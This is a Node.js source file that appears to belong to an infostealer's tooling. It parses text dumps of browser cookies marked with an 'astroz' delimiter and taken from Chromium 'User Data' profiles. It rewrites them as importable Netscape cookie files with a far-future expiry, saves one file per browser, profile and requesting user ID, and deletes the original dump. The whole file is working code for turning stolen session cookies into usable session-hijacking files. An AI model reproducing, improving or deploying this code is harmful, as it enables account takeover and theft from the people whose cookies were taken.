const fs = require('fs');

let datas = [];

function setup_cookies(data) {
    return new Promise(resolve => {
        let cookies = [];
        
        for (let x = 0; x < data.length; x++) {
            if (data[x]) {
                if (!data[x].includes('User Data')) { 
                    let line = data[x];
                    let host = line.split("|")[0].replace("HOST KEY: ", "").trim(), name = line.split("|")[1].replace(" NAME: ", "").trim(), value = line.split("|")[2].replace(" VALUE: ", "").trim();
                    console.log(host + "	" + "TRUE" + "	/" + "	FALSE" + "	2597573456	" + name + "	" + value)
                    cookies.push(host + "	" + "TRUE" + "	/" + "	FALSE" + "	2597573456	" + name + "	" + value)
                }
            }
        }

        resolve(cookies)
    })
}

function write_cookies(data, author) {
    return new Promise(resolve => {
        data.cookies.forEach(cookie => {
            fs.writeFileSync(`output\\${data.browser.replace(' ', '_')}-${data.profile.replace(' ', '_')}-${author.id}.txt`, `${cookie}\n`, { flag: 'a+' })
        })

        resolve(`output\\${data.browser.replace(' ', '_')}-${data.profile.replace(' ', '_')}-${author.id}.txt`)
    })
}

function parse_cookies(file) {
    return new Promise(resolve => {
        let text = fs.readFileSync(file, { flag: 'r+'})
        text = text.toString()

        if (!text.includes('@~$~@astroz')) {
            resolve("INVALID_TEXT_FILE")
        } else {
            let broke = text.split('@~$~@astroz-');
            for (let i = 0; i < broke.length; i++) {
                if (broke[i].split('\n')[0]) {

                    let browser = broke[i].split('\n')[0].split('\\Local\\')[1].split('\\')[0] + ' ' + broke[i].split('\n')[0].split('\\Local\\')[1].split('\\')[1];
                    let profile = broke[i].split('\n')[0].split('\\User Data\\')[1].split('\\')[0];
                    
                    let data = broke[i].split('\n')

                    setup_cookies(data).then(response => {
                        datas[i] = {'browser': browser, 'cookies': response, 'profile': profile }
                    })      
                }
            }

            fs.unlinkSync(file)

            resolve(datas)
        }
    })
}

module.exports.parse_cookies = parse_cookies;
module.exports.write_cookies = write_cookies;

process.on('unhandledRejection', (error) => {console.log(error)});
process.on("uncaughtException", (err, origin) => {console.log(err)})
process.on('uncaughtExceptionMonitor', (err, origin) => {console.log(err)});
process.on('beforeExit', (code) => {console.log(code)});
process.on('exit', (code) => {console.log(code)});
process.on('multipleResolves', (type, promise, reason) => {});